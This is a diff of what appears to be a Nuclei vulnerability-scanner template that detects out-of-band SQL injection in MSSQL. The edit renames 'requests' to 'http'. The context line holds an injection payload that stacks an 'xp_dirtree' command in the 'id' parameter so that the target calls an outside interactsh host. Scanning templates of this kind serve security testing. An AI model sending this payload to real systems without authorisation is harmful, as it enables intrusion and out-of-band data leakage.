@@ -6,7 +6,7 @@ info:
   author: reewardius
   tags: sqli,oob,mssql,dns
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?id=1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
